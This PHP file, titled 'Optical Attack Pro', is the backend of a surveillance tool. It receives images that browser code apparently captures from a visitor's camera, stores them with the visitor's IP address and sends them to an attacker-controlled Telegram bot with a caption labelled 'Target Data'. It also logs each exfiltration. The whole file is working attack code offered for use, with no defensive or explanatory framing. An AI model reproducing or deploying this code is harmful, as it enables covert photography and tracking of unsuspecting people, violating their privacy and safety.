<?php
// Optical Attack Pro - Telegram Image Exfiltration
// Made by Ahsan

define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE');
define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID_HERE');

// Get victim IP
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

// Receive image data from JavaScript
if (!empty($_POST['image'])) {
    $imageData = $_POST['image'];
    
    // Remove data URI header
    $imageData = str_replace('data:image/jpeg;base64,', '', $imageData);
    $imageData = str_replace('data:image/png;base64,', '', $imageData);
    
    // Decode
    $decodedData = base64_decode($imageData);
    $filename = 'optical_captures/capture_' . time() . '.jpg';
    
    // Create directory if not exists
    if (!is_dir('optical_captures')) {
        mkdir('optical_captures', 0755, true);
    }
    
    // Save locally
    file_put_contents($filename, $decodedData);
    
    // Send to Telegram
    sendToTelegram($decodedData, $ip);
    
    exit('OK');
}

function sendToTelegram($imageData, $victimIP) {
    $timestamp = date('Y-m-d H:i:s');
    
    // Save temp file
    $tempFile = tempnam(sys_get_temp_dir(), 'optical_');
    file_put_contents($tempFile, $imageData);
    
    // Send photo to Telegram
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendPhoto',
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => array(
            'chat_id' => TELEGRAM_CHAT_ID,
            'photo' => new CURLFile($tempFile),
            'caption' => "📸 *OPTICAL CAPTURE*\n\n" .
                        "🎯 *Target Data*\n" .
                        "🔹 IP: `" . $victimIP . "`\n" .
                        "🔹 Time: `" . $timestamp . "`\n" .
                        "🔹 Status: ✅ *ACTIVE*\n\n" .
                        "━━━━━━━━━━━━━━━━━━━━━\n" .
                        "*Optical Attack Pro v1.0*\n" .
                        "Made by Ahsan",
            'parse_mode' => 'Markdown'
        ),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10
    ));
    
    @curl_exec($ch);
    curl_close($ch);
    
    // Clean up
    @unlink($tempFile);
    
    // Log locally
    if (!is_dir('optical_logs')) {
        mkdir('optical_logs', 0755, true);
    }
    file_put_contents('optical_logs/exfil.log', "[" . date('Y-m-d H:i:s') . "] Sent to Telegram - IP: $victimIP\n", FILE_APPEND);
}

?>
